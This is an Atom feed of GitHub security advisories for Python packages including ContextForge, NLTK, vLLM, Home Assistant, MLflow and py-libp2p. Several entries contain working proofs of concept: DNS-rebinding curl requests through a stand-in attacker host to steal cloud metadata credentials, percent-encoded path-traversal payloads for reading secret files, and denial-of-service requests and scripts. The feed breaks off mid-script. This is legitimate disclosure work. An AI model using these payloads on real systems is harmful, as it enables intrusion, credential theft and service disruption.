<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-08-17T03:39:19.572Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mcp-contextforge-gateway] ContextForge: DNS TOCTOU race condition causes SSRF protection bypass (`/admin/gateways/test`)]]></title>
        <id>https://github.com/advisories/GHSA-9hgc-g3w5-67cm</id>
        <link href="https://github.com/advisories/GHSA-9hgc-g3w5-67cm"/>
        <updated>2026-08-14T19:49:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>/admin/gateways/test</code> endpoint validates submitted URLs by resolving the hostname at validation time and blocking private address ranges. The HTTP client independently re-resolves DNS at connection time with no IP binding between the two operations, creating a TOCTOU window exploitable via DNS rebinding. The source code explicitly acknowledges this limitation in two separate locations.</p>
<h2 id="details">Details</h2>
<p><code>validate_gateway_test_url()</code> in <code>mcpgateway/common/validators.py</code> (lines 1527–1710) calls <code>socket.getaddrinfo()</code> on the submitted hostname, checks whether the resolved IP falls in private, loopback, link-local, or cloud-metadata ranges (including <code>169.254.169.254</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>), and accepts the URL if the result is clean. The validated URL is then passed to the HTTP client <strong>as the original hostname string</strong>, not as the validated IP address.</p>
<p>The HTTP client (<code>httpx</code>, via <code>ResilientHttpClient</code>) performs its own independent DNS resolution at connection time. No mechanism bridges the two resolutions:</p>
<ul>
<li>The validated IP address is never passed to the HTTP client.</li>
<li>Only the original hostname is forwarded, triggering a second independent lookup.</li>
<li>No TTL enforcement, mandatory DNS-cache reuse, or IP-level socket binding is
implemented.</li>
</ul>
<p>The configuration options <code>ssrf_blocked_networks</code> (default: enabled, covers <code>169.254.169.254/32</code>, link-local ranges, etc.) and <code>ssrf_dns_fail_closed</code> (default: <code>True</code>) apply exclusively at <strong>validation time</strong>. They share the same TOCTOU gap because they operate on the validation-time resolution result, not on the connection-time resolution performed by the HTTP client.</p>
<h3 id="two-independent-acknowledgements-in-the-source-code">Two independent acknowledgements in the source code</h3>
<p><strong>Location 1</strong> — <code>mcpgateway/common/validators.py</code>, lines 1537–1543 (function docstring of <code>validate_gateway_test_url</code>):</p>
<blockquote>
<p>"DNS TOCTOU Limitation: This validation resolves DNS at validation time, but
the HTTP client will re-resolve DNS at connection time. An attacker controlling
DNS can return a public IP during validation and a private IP during connection
(DNS rebinding). True mitigation requires pinning the validated IP into the
connection (custom resolver/transport, or IP allowlist check at connect
callback). This is tracked as a known limitation for future improvement."</p>
</blockquote>
<p><strong>Location 2</strong> — <code>mcpgateway/admin.py</code>, lines 14025–14029 (call site comment):</p>
<blockquote>
<p>"TODO(ICACF-15): DNS rebinding risk — allowlist and SSRF checks resolve DNS,
but the actual ResilientHttpClient request resolves DNS a third time. An
attacker-controlled DNS server could return a public IP during validation and a
private IP during the actual request. Consider pinning the resolved IP for
outbound requests (custom transport) or caching DNS resolution across
validation and request phases."</p>
</blockquote>
<p>The existence of a named TODO ticket (ICACF-15) confirms the maintainers consider this an open, tracked defect.</p>
<h3 id="prerequisites">Prerequisites</h3>
<ol>
<li><code>MCPGATEWAY_ADMIN_API_ENABLED=true</code> (not the default; must be explicitly
enabled by an operator).</li>
<li>The attacker holds a credential with explicit <code>gateways.read</code> permission
assigned via a database role.</li>
</ol>
<p>Regarding prerequisite 2: the endpoint is decorated with @require_permission("gateways.read", allow_admin_bypass=False). The allow_admin_bypass=False flag explicitly disables the platform-admin shortcut, meaning even a platform admin must hold an explicit database-backed role assignment that carries gateways.read. A credential produced solely via the platform-admin bootstrap bypass described in the companion advisory (GHSA-m8rv-5m6m-32ff) — a virtual identity with no database record — is rejected with HTTP 403 at this endpoint because no role lookup can succeed without a database row. An attacker who has forged a JWT via that bootstrap path does not automatically gain access to this endpoint; they still require a separately provisioned account with an appropriate role.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash">cd /opt/mcp-cf-test
MCPGATEWAY_ADMIN_API_ENABLED=true \
JWT_SECRET_KEY=my-test-key-but-now-longer-than-32-bytes \
uvicorn mcpgateway.main:app --host 0.0.0.0 --port 8000 &amp;
sleep 5
</code></pre>
<h3 id="step-1--obtain-a-token-for-an-account-with-database-role-assignment">Step 1 — Obtain a token for an account with database role assignment</h3>
<p>The exploit requires a credential for a user who exists in the database with a role carrying <code>gateways.read</code> (e.g., <code>platform_admin</code>, which holds the <code>*</code> wildcard). Register a user through the Admin UI or API and assign the <code>platform_admin</code> role, then generate a JWT:</p>
<pre><code class="language-python">import datetime, jwt, uuid

SECRET = "my-test-key-but-now-longer-than-32-bytes"
EMAIL  = "admin@example.com"   # must have platform_admin role in DB
now    = datetime.datetime.now(datetime.timezone.utc)

payload = {
    "sub": EMAIL,
    "aud": "mcpgateway-api",
    "iss": "mcpgateway",
    "jti": str(uuid.uuid4()),
    "iat": now,
    "exp": now + datetime.timedelta(hours=1),
}
print(jwt.encode(payload, SECRET, algorithm="HS256"), end="")
</code></pre>
<pre><code class="language-bash">TOKEN=$(python3 /tmp/gen_token.py)
</code></pre>
<h3 id="step-2--baseline-control-direct-private-ip-is-rejected">Step 2 — Baseline control: direct private IP is rejected</h3>
<p>Submitting a literal private IP is blocked unconditionally before any DNS resolution occurs:</p>
<pre><code class="language-bash">curl -s -w "\nHTTP %{http_code}\n" \
  -X POST http://127.0.0.1:8000/admin/gateways/test \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/", "method": "GET"}'
# Expected: HTTP 400 — "Invalid gateway URL"
</code></pre>
<h3 id="step-3--dns-rebinding-attack">Step 3 — DNS rebinding attack</h3>
<ol>
<li>Attacker controls DNS for <code>attacker.example.com</code> with TTL set to 1 second.</li>
<li>Initial record: <code>attacker.example.com → 1.2.3.4</code> (any public IP).</li>
<li>Submit the request:</li>
</ol>
<pre><code class="language-bash">curl -s -w "\nHTTP %{http_code}\n" \
  -X POST http://127.0.0.1:8000/admin/gateways/test \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://attacker.example.com/latest/meta-data/", "method": "GET"}'
</code></pre>
<ol start="4">
<li><code>validate_gateway_test_url()</code> resolves <code>attacker.example.com → 1.2.3.4</code>;
all SSRF checks pass.</li>
<li>Attacker immediately flips the DNS record:
<code>attacker.example.com → 169.254.169.254</code>.</li>
<li><code>httpx</code> independently re-resolves the hostname and connects to
<code>169.254.169.254</code>.</li>
<li>The gateway returns the IMDS response body to the caller.</li>
</ol>
<p>Standard DNS rebinding infrastructure (e.g., <code>rbndr.us</code>) reliably achieves this window against the 1-second TTL. In cloud environments with IMDSv2 disabled or not enforced, the response contains IAM role credentials.</p>
<h2 id="impact">Impact</h2>
<p>Server-Side Request Forgery against internal services and cloud instance metadata. An attacker with a sufficiently privileged credential can probe internal network services, retrieve cloud credentials from <code>169.254.169.254/latest/meta-data/iam/security credentials/</code>, access internal APIs not exposed to the internet, or conduct port scanning of the internal network. In cloud environments where IMDSv1 is accessible, this can lead to full cloud account compromise through metadata-service credential theft.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>After DNS validation passes, pin the connection to the validated IP address rather than re-passing the hostname to the HTTP client. Implement this via a custom <code>httpx</code> transport or resolver that binds the socket to the already-resolved address and sets the <code>Host</code> header to the original hostname. Additionally, enforce a maximum DNS resolution age and refuse to connect if the elapsed time between validation and connection exceeds a configurable threshold. The codebase already tracks this requirement under TODO ICACF-15; the suggested fix closes it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/IBM/mcp-context-forge/security/advisories/GHSA-9hgc-g3w5-67cm">https://github.com/IBM/mcp-context-forge/security/advisories/GHSA-9hgc-g3w5-67cm</a></li>
<li><a href="https://github.com/IBM/mcp-context-forge/releases/tag/v1.0.3">https://github.com/IBM/mcp-context-forge/releases/tag/v1.0.3</a></li>
<li><a href="https://github.com/advisories/GHSA-9hgc-g3w5-67cm">https://github.com/advisories/GHSA-9hgc-g3w5-67cm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9hgc-g3w5-67cm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-14T19:49:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] nltk: Arbitrary File Read via Path Traversal in nltk.data.load() through Percent-Encoded Sequences]]></title>
        <id>https://github.com/advisories/GHSA-m42h-3232-vpv3</id>
        <link href="https://github.com/advisories/GHSA-m42h-3232-vpv3"/>
        <updated>2026-08-13T20:45:06.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>nltk.data.load() and nltk.data.find() resolve user-supplied resource names to filesystem paths using url2pathname(), which decodes percent-encoded sequences (e.g. %2e%2e to ..). Path safety checks are performed on the raw, still-encoded string before decoding occurs. An attacker supplying %2e%2e instead of .. bypasses all path validation and reads arbitrary files outside the NLTK data directory.</p>
<h1 id="vulnerable-code">Vulnerable Code</h1>
<p>nltk/data.py - find() function:
 url2pathname() decodes %2e%2e -&gt; .. AFTER any safety check
p = os.path.join(path_, url2pathname(resource_name))
if os.path.exists(p):
    return FileSystemPathPointer(p)</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>import nltk.data
nltk.data.path = ["/home/user/nltk_data"]
%2e%2e decodes to .. via url2pathname(), escaping the data dir
data = nltk.data.load("%2e%2e/SECRET_credentials.txt", format="raw")
print(data)
 b'AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE\nDATABASE_PASS=hunter2\n'
All of these bypass path checks and decode identically:</p>
<h1 id="payload-after-url2pathname">Payload	After url2pathname()</h1>
<p>%2e%2e/secret	../secret
.%2e/secret	../secret
%2e./secret	../secret
%2E%2E/secret	../secret
Root Cause
url2pathname() is called after path safety checks, not before. Encoding .. as %2e%2e passes every check, then decodes to a traversal sequence at filesystem access time.</p>
<h1 id="fix">Fix</h1>
<p>Decode before checking:</p>
<p>from urllib.parse import unquote
resource_name = unquote(resource_name)  # decode first, then validate</p>
<h1 id="impact">Impact</h1>
<p>An attacker who controls the resource name passed to nltk.data.load() can read any file the process has permission to access - credentials, environment files, SSH private keys, /etc/passwd, /proc/self/environ, application config files, etc. This affects any application that passes user-controlled input to nltk.data.load() or nltk.data.find().</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-m42h-3232-vpv3">https://github.com/nltk/nltk/security/advisories/GHSA-m42h-3232-vpv3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12243">https://nvd.nist.gov/vuln/detail/CVE-2026-12243</a></li>
<li><a href="https://github.com/nltk/nltk/issues/3504">https://github.com/nltk/nltk/issues/3504</a></li>
<li><a href="https://github.com/nltk/nltk/pull/3522">https://github.com/nltk/nltk/pull/3522</a></li>
<li><a href="https://github.com/nltk/nltk/commit/aec4fce1b84ad725b8975f7365b23a4f626572a9">https://github.com/nltk/nltk/commit/aec4fce1b84ad725b8975f7365b23a4f626572a9</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-597.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-597.yaml</a></li>
<li><a href="https://huntr.com/bounties/39aa9354-54ca-4e77-96da-580eb1fe6ed1">https://huntr.com/bounties/39aa9354-54ca-4e77-96da-580eb1fe6ed1</a></li>
<li><a href="https://securityinfinity.com/research/path-traversal-in-nltks-nltk-data-load-via-percent-encoded-sequences">https://securityinfinity.com/research/path-traversal-in-nltks-nltk-data-load-via-percent-encoded-sequences</a></li>
<li><a href="https://github.com/advisories/GHSA-m42h-3232-vpv3">https://github.com/advisories/GHSA-m42h-3232-vpv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m42h-3232-vpv3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-13T20:45:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Duplicate Advisory: Arbitrary File Read via Path Traversal in nltk.data.load() through Percent-Encoded Sequences]]></title>
        <id>https://github.com/advisories/GHSA-q5h6-fcf5-49g9</id>
        <link href="https://github.com/advisories/GHSA-q5h6-fcf5-49g9"/>
        <updated>2026-08-13T20:44:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-m42h-3232-vpv3. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>NLTK version 3.9.4 is vulnerable to a path traversal attack due to an incomplete fix for GitHub Issue #3504. The <code>_UNSAFE_NO_PROTOCOL_RE</code> regex in <code>nltk/data.py</code> checks for literal <code>../</code> sequences but fails to account for percent-encoded traversal sequences such as <code>..%2f</code>. The <code>url2pathname()</code> function decodes these sequences after the validation step, allowing an attacker to bypass the protection. This vulnerability enables an attacker to read arbitrary files accessible to the Python process by controlling the resource name parameter passed to <code>nltk.data.load()</code> or <code>nltk.data.find()</code>. The issue affects applications that rely on NLTK for resource loading, including NLP web applications, Jupyter notebooks, and CLI tools. The default <code>pathsec.ENFORCE=False</code> setting exacerbates the impact by not blocking the file read at the <code>open()</code> stage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12243">https://nvd.nist.gov/vuln/detail/CVE-2026-12243</a></li>
<li><a href="https://huntr.com/bounties/39aa9354-54ca-4e77-96da-580eb1fe6ed1">https://huntr.com/bounties/39aa9354-54ca-4e77-96da-580eb1fe6ed1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-597.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-597.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-q5h6-fcf5-49g9">https://github.com/advisories/GHSA-q5h6-fcf5-49g9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q5h6-fcf5-49g9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-30T03:37:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Completion prompt lists fan out into unbounded engine requests]]></title>
        <id>https://github.com/advisories/GHSA-87x5-vmc3-756j</id>
        <link href="https://github.com/advisories/GHSA-87x5-vmc3-756j"/>
        <updated>2026-08-13T18:40:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>/v1/completions</code> request model accepts <code>prompt</code> as a list of text prompts or a list of token-id prompts without any outer prompt-count bound. The serving path turns each element into a separate engine input, creates one engine generator per element, merges all generators, and allocates a response slot per prompt. An authenticated API client can therefore turn one request into an attacker-chosen number of backend subrequests before any aggregate request-count budget is enforced.</p>
<h2 id="technical-details">Technical Details</h2>
<p><code>CompletionRequest.prompt</code> allows both list-shaped prompt inputs and scalar prompts:</p>
<pre><code class="language-python"># vllm/entrypoints/openai/completion/protocol.py
prompt: (
    list[Annotated[int, Field(ge=0)]]
    | list[list[Annotated[int, Field(ge=0)]]]
    | str
    | list[str]
    | None
) = None
</code></pre>
<p>The validator only requires some prompt-like input to be present:</p>
<pre><code class="language-python">def validate_prompt_and_prompt_embeds(cls, data):
    prompt = data.get("prompt")
    prompt_embeds = data.get("prompt_embeds")
    ...
    if prompt_is_empty and embeds_is_empty:
        raise VLLMValidationError(...)
</code></pre>
<p>The renderer then expands list-shaped prompts as a sequence. <code>prompt_to_seq()</code> wraps a scalar string or a single token-id list, but returns a <code>list[str]</code> or <code>list[list[int]]</code> unchanged:</p>
<pre><code class="language-python"># vllm/renderers/inputs/preprocess.py
def prompt_to_seq(prompt_or_prompts):
    if isinstance(prompt_or_prompts, (dict, str, bytes)) or (
        len(prompt_or_prompts) &gt; 0 and is_list_of(prompt_or_prompts, int)
    ):
        return [prompt_or_prompts]

    return prompt_or_prompts
</code></pre>
<p><code>OnlineRenderer.preprocess_completion()</code> appends that whole sequence, and the renderer processes every element:</p>
<pre><code class="language-python"># vllm/renderers/online_renderer.py
prompts = list[SingletonPrompt | bytes]()
if prompt_input is not None:
    prompts.extend(prompt_to_seq(prompt_input))
...
parsed_prompts = [
    prompt if isinstance(prompt, bytes) else parse_model_prompt(model_config, prompt)
    for prompt in prompts
]
return await renderer.render_cmpl_async(parsed_prompts, tok_params, ...)
</code></pre>
<p>Finally, completion serving creates one backend generator and one response slot per rendered prompt:</p>
<pre><code class="language-python"># vllm/entrypoints/openai/completion/serving.py
generators: list[AsyncGenerator[RequestOutput, None]] = []
for i, engine_input in enumerate(engine_inputs):
    ...
    generator = self.engine_client.generate(...)
    generators.append(generator)

result_generator = merge_async_iterators(*generators)
num_prompts = len(engine_inputs)
...
final_res_batch: list[RequestOutput | None] = [None] * num_prompts
</code></pre>
<p>The violated invariant is that one HTTP request should have a bounded backend request count. Current code enforces per-prompt token and sampling limits, but not the number of prompts in the outer completion request.</p>
<h2 id="pov">PoV</h2>
<p>A minimal oversized request keeps normal generation parameters small but supplies a large outer prompt list:</p>
<pre><code class="language-json">{
  "model": "served-model",
  "prompt": ["x", "x", "x"],
  "max_tokens": 1,
  "n": 1
}
</code></pre>
<p>Scaling the <code>prompt</code> array to tens or hundreds of thousands of short entries makes the server allocate, preprocess, schedule, merge, and buffer one subrequest per entry. The same applies to token-id prompt lists:</p>
<pre><code class="language-json">{
  "model": "served-model",
  "prompt": [[1], [1], [1]],
  "max_tokens": 1,
  "n": 1
}
</code></pre>
<p>The intended negative control is a scalar prompt:</p>
<pre><code class="language-json">{
  "model": "served-model",
  "prompt": "x",
  "max_tokens": 1,
  "n": 1
}
</code></pre>
<p>The scalar string is wrapped as one prompt; the list form is not bounded and fans out by list length.</p>
<h2 id="impact">Impact</h2>
<p>An authenticated API client can make one <code>/v1/completions</code> request consume CPU, memory, async task scheduling, engine request slots, and response buffering proportional to an attacker-chosen outer prompt list. This can starve or disrupt other tenants sharing the same vLLM server. The report does not claim unauthenticated access, confidentiality impact, integrity impact, code execution, or impact where <code>/v1/completions</code> is not reachable by untrusted or semi-trusted clients.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Reject oversized prompt lists before renderer preprocessing. Add an outer prompt-count limit to <code>CompletionRequest.prompt</code> when the prompt is <code>list[str]</code> or <code>list[list[int]]</code>, and consider making the limit configurable in the same style as the batch-chat and sampling-list bounds. The check should run before <code>OnlineRenderer.preprocess_completion()</code> expands the prompt sequence, so oversized requests do not allocate parsed prompt lists, async render/tokenization tasks, engine generators, or response result slots.</p>
<p>Regression coverage should include a scalar prompt, a bounded prompt list, an oversized <code>list[str]</code>, and an oversized <code>list[list[int]]</code>. The oversized requests should fail with a controlled validation error before any backend generator is created.</p>
<h2 id="affected-packageversions">Affected Package/Versions</h2>
<p>Package ecosystem: pip</p>
<p>Package name: <code>vllm</code></p>
<p>Affected range confirmed by source proof: <code>&gt;=0.19.0, &lt;=0.24.0</code>; current <code>main</code> at <code>cbe9c40f998f13975b967773ac7e7920e115387f</code> remains affected.</p>
<p>Patched versions: unknown.</p>
<p>Latest release checked: <code>v0.24.0</code>, published on 2026-06-29.</p>
<h2 id="github-advisory-metadata">GitHub Advisory Metadata</h2>
<p>Package ecosystem: pip</p>
<p>Package name: <code>vllm</code></p>
<p>Vulnerable version range: <code>&gt;=0.19.0, &lt;=0.24.0</code></p>
<p>Patched versions: unknown</p>
<h2 id="advisory-history">Advisory History</h2>
<p>Public issue and PR searches for <code>CompletionRequest prompt list</code>, <code>"prompt" "list[str]" "completion"</code>, and <code>"CompletionRequest" "max_length"</code> did not find an existing report or fix for this exact path.</p>
<p>The closest published advisory is <code>GHSA-3mwp-wvh9-7528</code>, "OOM Denial of Service via Unbounded <code>n</code> Parameter in OpenAI API Server", patched in <code>0.19.0</code>. This report is distinct because it keeps <code>n=1</code> and uses the <code>/v1/completions</code> <code>prompt</code> outer list to create one engine request per prompt. The fix invariant is an outer prompt-count and aggregate request budget, not only a generated-sequence-count cap.</p>
<p>The closest public PR is <code>vllm-project/vllm#45390</code>, which covers multiple DoS fixes including <code>GHSA-83mh-6mwq-3hg9</code> for <code>BatchChatCompletionRequest.messages</code>. That PR adds an outer bound to batch chat conversations, but its diff does not touch <code>vllm/entrypoints/openai/completion/protocol.py</code> or <code>vllm/entrypoints/openai/completion/serving.py</code>.</p>
<p>Prior local/private report families checked included pooling/rerank batch fanout, derender token-id postprocessing, explicit <code>truncation_side</code> tokenizer-limit bypass, Python disaggregated generate prompt-length bypass, and priority scheduling. Those reports differ by endpoint, attacker-controlled field, sink, and fix surface.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-87x5-vmc3-756j">https://github.com/vllm-project/vllm/security/advisories/GHSA-87x5-vmc3-756j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73559">https://nvd.nist.gov/vuln/detail/CVE-2026-73559</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/47845">https://github.com/vllm-project/vllm/pull/47845</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/675f4295cdfe0d870471c2b51bfeca3a68a9569e">https://github.com/vllm-project/vllm/commit/675f4295cdfe0d870471c2b51bfeca3a68a9569e</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
<li><a href="https://github.com/advisories/GHSA-87x5-vmc3-756j">https://github.com/advisories/GHSA-87x5-vmc3-756j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87x5-vmc3-756j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-13T18:40:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[homeassistant] Home Assistant Core vulnerable to Path Traversal via backup upload during onboarding]]></title>
        <id>https://github.com/advisories/GHSA-5hxg-r395-fqxx</id>
        <link href="https://github.com/advisories/GHSA-5hxg-r395-fqxx"/>
        <updated>2026-08-13T18:37:35.000Z</updated>
        <content type="html"><![CDATA[<p>Home Assistant Core before 2026.6.0 contains a path traversal vulnerability that allows unauthenticated attackers to write arbitrary files to any directory on the host filesystem by uploading a crafted backup archive during the initial onboarding window. Attackers can manipulate the 'name' field inside the uploaded archive's backup.json to supply an absolute path, causing pathlib.Path.<strong>truediv</strong> to discard the configured backup directory prefix and write attacker-controlled content to arbitrary locations, with full filesystem access when the process runs as root.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-64825">https://nvd.nist.gov/vuln/detail/CVE-2026-64825</a></li>
<li><a href="https://github.com/home-assistant/core/pull/172368">https://github.com/home-assistant/core/pull/172368</a></li>
<li><a href="https://github.com/home-assistant/core/commit/567fe858289876b68b8162a77bd46e1e1af79752">https://github.com/home-assistant/core/commit/567fe858289876b68b8162a77bd46e1e1af79752</a></li>
<li><a href="https://github.com/home-assistant/core/releases/tag/2026.6.0">https://github.com/home-assistant/core/releases/tag/2026.6.0</a></li>
<li><a href="https://www.vulncheck.com/advisories/home-assistant-core-path-traversal-file-write-via-backup-upload">https://www.vulncheck.com/advisories/home-assistant-core-path-traversal-file-write-via-backup-upload</a></li>
<li><a href="https://github.com/advisories/GHSA-5hxg-r395-fqxx">https://github.com/advisories/GHSA-5hxg-r395-fqxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5hxg-r395-fqxx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-21T18:31:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow: trace API endpoints lack proper authorization validators]]></title>
        <id>https://github.com/advisories/GHSA-2cm6-r77w-6g96</id>
        <link href="https://github.com/advisories/GHSA-2cm6-r77w-6g96"/>
        <updated>2026-08-13T18:27:49.000Z</updated>
        <content type="html"><![CDATA[<p>In MLflow versions prior to 3.13.0, when running with authentication enabled, the trace API endpoints lack proper authorization validators. This allows any authenticated user to bypass experiment-level authorization controls on all trace operations, including reading, deleting, and modifying traces on experiments they do not have permission to access. The issue arises from the <code>_before_request</code> handler, which does not register authorization validators for trace endpoints, resulting in requests proceeding without validation. This vulnerability can expose sensitive data, destroy audit logs, and allow unauthorized modifications.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8147">https://nvd.nist.gov/vuln/detail/CVE-2026-8147</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/f9b1eb510478570609ef451984a255775aa4b937">https://github.com/mlflow/mlflow/commit/f9b1eb510478570609ef451984a255775aa4b937</a></li>
<li><a href="https://huntr.com/bounties/b00c3ddd-373e-492f-9bf0-41a28bb21ed5">https://huntr.com/bounties/b00c3ddd-373e-492f-9bf0-41a28bb21ed5</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/23014">https://github.com/mlflow/mlflow/pull/23014</a></li>
<li><a href="https://github.com/mlflow/mlflow/releases/tag/v3.13.0">https://github.com/mlflow/mlflow/releases/tag/v3.13.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2cm6-r77w-6g96">https://github.com/advisories/GHSA-2cm6-r77w-6g96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2cm6-r77w-6g96</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T09:32:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libp2p] libp2p: yamux connection DoS via oversized data frame]]></title>
        <id>https://github.com/advisories/GHSA-hmj8-5xmh-5573</id>
        <link href="https://github.com/advisories/GHSA-hmj8-5xmh-5573"/>
        <updated>2026-08-13T17:43:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The yamux stream multiplexer in py-libp2p does not validate incoming DATA frame lengths against the receive window before reading the frame body. Any peer that completes a standard libp2p handshake can send a single 12-byte frame claiming a 4 GB body, causing the victim's yamux read loop to block indefinitely. This affects the default <code>new_host()</code> configuration and requires no special setup on either side.</p>
<h3 id="details">Details</h3>
<p>In <code>libp2p/stream_muxer/yamux/yamux.py</code> (lines 915 to 926), the <code>handle_incoming()</code> method dispatches on frame type. When a DATA frame arrives, it reads the body unconditionally:</p>
<pre><code class="language-python">elif typ == TYPE_DATA:
    try:
        data = (
            await read_exactly(self.secured_conn, length)
            if length &gt; 0
            else b""
        )
</code></pre>
<p>The <code>length</code> field is taken directly from the wire-decoded frame header, a 32-bit unsigned integer with a maximum value of 4,294,967,295. There is no check that <code>length</code> fits within the stream's receive window (<code>DEFAULT_WINDOW_SIZE = 256 * 1024</code> bytes). The body read also happens before the code checks whether the referenced <code>stream_id</code> even exists in <code>self.streams</code> (that check is at line 954), so any stream ID triggers the issue.</p>
<p><code>handle_incoming()</code> itself is a single sequential loop with no timeout around the body read. Once <code>read_exactly</code> suspends waiting for data that never comes, the loop cannot process any subsequent frames. Every stream on that yamux connection stops working, and no exception is raised.</p>
<p>The same unguarded call appears in the SYN branch at lines 804 to 806, so a crafted SYN frame with a large length field triggers the same stall.</p>
<p>The yamux specification (section 3.3) explicitly requires the receiver to reset the stream if a sender transmits more data than the receive window allows. py-libp2p does not enforce this on the receiver side. All three comparable implementations do: go-yamux tracks <code>recvWindow</code> per stream and returns a <code>SendWindowExceeded</code> error on violation; rust-yamux validates frame length against the stream credit; js-libp2p yamux checks frame length against <code>maxMessageSize</code>.</p>
<h3 id="poc">PoC</h3>
<p>The harness completes a normal noise handshake and yamux negotiation between two local hosts, confirms yamux is healthy with a pre-attack ping, then writes a single malicious frame directly to the attacker's secured connection. After a short pause, it attempts to open a new stream with a 3-second deadline. The stream open never completes.</p>
<p>File: test_poc.py</p>
<pre><code class="language-python">"""
author: @tahaafarooq
POC: yamux connection DoS via oversized data frame (connection DoS)
"""
import os
import secrets
import gc
import struct

import psutil
import trio
import multiaddr

from libp2p import new_host
from libp2p.crypto.ed25519 import create_new_key_pair
from libp2p.custom_types import TProtocol
from libp2p.peer.peerinfo import PeerInfo
from libp2p.stream_muxer.yamux.yamux import Yamux

LOOPBACK = multiaddr.Multiaddr("/ip4/127.0.0.1/tcp/0")
PING = TProtocol("/audit/ping/1.0.0")

YAMUX_HEADER_FORMAT = "!BBHII"
TYPE_DATA = 0x0
HUGE_LENGTH = 0xFFFF_FFFF  # max uint32 — 4,294,967,295 bytes


def craft_malicious_frame(stream_id: int = 1) -&gt; bytes:
    """
    12-byte yamux DATA frame with flags=0 and length=4 GB.
    The stream_id is irrelevant: yamux reads the body BEFORE checking
    whether the stream exists.
    """
